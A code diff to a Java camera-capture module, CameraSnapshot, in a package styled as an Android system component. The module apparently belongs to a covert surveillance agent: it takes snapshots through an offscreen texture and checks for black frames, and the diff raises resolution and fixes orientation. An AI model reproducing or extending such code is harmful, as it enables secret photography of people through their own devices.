@@ -17,6 +17,7 @@
 package com.android.dvci.module.camera;
 
 import android.annotation.TargetApi;
+import android.app.Activity;
 import android.graphics.ImageFormat;
 import android.graphics.Rect;
 import android.graphics.SurfaceTexture;
@@ -25,7 +26,9 @@ import android.hardware.Camera;
 import android.opengl.GLES20;
 import android.os.Build;
 import android.util.Log;
+import android.view.Surface;
 
+import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.module.ModuleCamera;
 import com.android.dvci.util.Check;
@@ -109,35 +112,6 @@ public class CameraSnapshot {
 		}
 	};
 
-	private Camera.Size getBestPreviewSize(int width, int height, Camera.Parameters parameters){
-		Camera.Size bestSize = null;
-		List<Camera.Size> sizeList = parameters.getSupportedPreviewSizes();
-
-		bestSize = sizeList.get(0);
-
-		for(int i = 1; i < sizeList.size(); i++){
-			if((sizeList.get(i).width * sizeList.get(i).height) >
-					(bestSize.width * bestSize.height)){
-				bestSize = sizeList.get(i);
-			}
-		}
-
-		return bestSize;
-	}
-
-
-	private boolean isBlack(byte[] raw) {
-		for (int i = 0; i < raw.length; i++) {
-			if (raw[i] > 20) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (isBlack), it's not black: " + raw[i]);
-				}
-				return false;
-			}
-		}
-		return true;
-	}
-
 	/**
 	 * Wraps encodeCameraToMpeg().  This is necessary because SurfaceTexture will try to use
 	 * the looper in the current thread if one exists, and the CTS tests create one on the
@@ -151,8 +125,8 @@ public class CameraSnapshot {
 	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
 	public void snapshot(boolean face) {
 		// arbitrary but popular values
-		int encWidth = 640;
-		int encHeight = 480;
+		final int encWidth = 1024;
+		final int encHeight = 768;
 
 		synchronized (cameraLock) {
 			try {
@@ -169,11 +143,19 @@ public class CameraSnapshot {
 
 				int[] surfaceparams = new int[1];
 				GLES20.glGenTextures(1, surfaceparams, 0);
-				GLES20.glBindTexture(36197, surfaceparams[0]);
-				GLES20.glTexParameterf(36197, 10241, 9729f);
-				GLES20.glTexParameterf(36197, 10240, 9729f);
-				GLES20.glTexParameteri(36197, 10242, 33071);
-				GLES20.glTexParameteri(36197, 10243, 33071);
+
+				/*GLES20.glBindTexture(36197, surfaceparams[0]);
+				GLES20.glTexParameterf(36197, GLES20.GL_TEXTURE_MIN_FILTER, GLES20.GL_LINEAR);
+				GLES20.glTexParameterf(36197, GLES20.GL_TEXTURE_MAG_FILTER, GLES20.GL_LINEAR);
+				GLES20.glTexParameteri(36197, GLES20.GL_TEXTURE_WRAP_S, GLES20.GL_CLAMP_TO_EDGE);
+				GLES20.glTexParameteri(36197, GLES20.GL_TEXTURE_WRAP_T, GLES20.GL_CLAMP_TO_EDGE);
+				*/
+				GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, surfaceparams[0]);
+				GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_WRAP_S,
+						GLES20.GL_CLAMP_TO_EDGE);
+				GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_WRAP_T,
+						GLES20.GL_CLAMP_TO_EDGE);
+
 
 				this.surface = new SurfaceTexture(surfaceparams[0]);
 
@@ -212,6 +194,7 @@ public class CameraSnapshot {
 						Check.log(TAG + " (openCamera), opened: " + camIdx);
 					}
 					if(cam!=null) {
+						setCameraDisplayOrientation(camIdx, cam);
 						return cam;
 					}
 				} catch (RuntimeException e) {
@@ -230,11 +213,9 @@ public class CameraSnapshot {
 	 * <p/>
 	 * Opens a Camera and sets parameters.  Does not start preview.
 	 */
-	@TargetApi(Build.VERSION_CODES.GINGERBREAD)
 	private Camera prepareCamera(boolean face, int encWidth, int encHeight) {
 		try {
 
-			Camera.CameraInfo info = new Camera.CameraInfo();
 			Camera mCamera = openCamera(face);
 			if(mCamera == null){
 				return null;
@@ -249,6 +230,7 @@ public class CameraSnapshot {
 			mCamera.setParameters(cameraParms);
 
 			Camera.Size size = cameraParms.getPreviewSize();
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (prepareCamera), Camera preview size is " + size.width + "x" + size.height);
 			}
@@ -271,11 +253,13 @@ public class CameraSnapshot {
 	 */
 	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
 	private static void choosePreviewSize(Camera.Parameters parms, int width, int height) {
-		Camera.Size ppsfv = parms.getPreferredPreviewSizeForVideo();
-		if (ppsfv != null) {
+		//Camera.Size ppsfv = parms.getPreferredPreviewSizeForVideo();
+
+		Camera.Size best = getBestPreviewSize(parms, width, height);
+		if (best != null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (choosePreviewSize), Camera preferred preview size for video is " +
-				ppsfv.width + "x" + ppsfv.height);
+				Check.log(TAG + " (choosePreviewSize), Camera best preview size for video is " +
+						best.width + "x" + best.height);
 			}
 		}
 
@@ -287,10 +271,86 @@ public class CameraSnapshot {
 		}
 
 		Log.w(TAG, "Unable to set preview size to " + width + "x" + height);
-		if (ppsfv != null) {
-			parms.setPreviewSize(ppsfv.width, ppsfv.height);
+		if (best != null) {
+			parms.setPreviewSize(best.width, best.height);
 		}
 	}
+
+	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
+	public static void setCameraDisplayOrientation(int cameraId, android.hardware.Camera camera) {
+		try {
+			android.hardware.Camera.CameraInfo info =
+					new Camera.CameraInfo();
+			android.hardware.Camera.getCameraInfo(cameraId, info);
+
+			int rotation = Status.getAppGui().getWindowManager().getDefaultDisplay()
+					.getRotation();
+			int degrees = 0;
+			Log.d(TAG, "rotation:" + rotation);
+			switch (rotation) {
+				case Surface.ROTATION_0:
+					degrees = 0;
+					break;
+				case Surface.ROTATION_90:
+					degrees = 90;
+					break;
+				case Surface.ROTATION_180:
+					degrees = 180;
+					break;
+				case Surface.ROTATION_270:
+					degrees = 270;
+					break;
+			}
+
+			int result;
+			if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
+				result = (info.orientation + degrees) % 360;
+				result = (360 - result) % 360;  // compensate the mirror
+			} else {  // back-facing
+				result = (info.orientation - degrees + 360) % 360;
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (setCameraDisplayOrientation), " + degrees);
+			}
+			camera.setDisplayOrientation(result);
+		}catch(Exception ex){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (setCameraDisplayOrientation), ERROR: " + ex);
+			}
+		}
+	}
+
+	private static Camera.Size getBestPreviewSize(Camera.Parameters parameters, int width, int height){
+		Camera.Size bestSize = null;
+		List<Camera.Size> sizeList = parameters.getSupportedPreviewSizes();
+
+		int maxSize = width * height;
+		bestSize = null;
+
+		for(int i = 1; i < sizeList.size(); i++){
+			int area = sizeList.get(i).width * sizeList.get(i).height;
+			int areaBest = (bestSize!=null? bestSize.width * bestSize.height : 0);
+			if(area > areaBest && area < maxSize){
+				bestSize = sizeList.get(i);
+			}
+		}
+
+		return bestSize;
+	}
+
+
+	private boolean isBlack(byte[] raw) {
+		for (int i = 0; i < raw.length; i++) {
+			if (raw[i] > 20) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (isBlack), it's not black: " + raw[i]);
+				}
+				return false;
+			}
+		}
+		return true;
+	}
+
 
 	/**
 	 * Stops camera preview, and releases the camera to the system.
